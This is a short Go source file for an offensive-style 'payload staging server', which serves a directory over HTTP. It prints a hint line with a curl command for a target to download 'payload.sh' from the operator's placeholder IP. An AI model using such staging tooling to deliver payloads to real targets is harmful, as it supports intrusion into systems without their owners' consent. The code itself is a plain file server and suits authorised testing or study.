package main

import (
	"log"
	"net/http"
	"os"
	"fmt"
)

// Function for staging the payload directory
func stagePayloadDirectory(port string, stagingDir string)  {
	// Creates the staging diredctory if it doesnt exist
	if _, err := os.Stat(stagingDir); os.IsNotExist(err) {
		// Stores the errors from creating the directory
		err := os.MkdirAll(stagingDir, 0755)

		// Checks if there is a error
		if err != nil {
			log.Fatal("Error creating directory:", err)
		}

		// Add a possible section for adding files from a file here
	}

	// Creates the file server handler
	fileServer := http.FileServer(http.Dir(stagingDir))

	// Outputs information
	fmt.Printf("[*] Go Payload Staging Server running on port %s\n", port)
	fmt.Printf("[*] Serving files from: %s\n", stagingDir)
	fmt.Printf("[*] Target download: curl http://<your-ip>:%s/payload.sh\n", port)

	// Starts the server
	err := http.ListenAndServe(":"+port, fileServer)

	// Checks if there is an error
	if err != nil {
		log.Fatal("Server failed:", err)
	}
}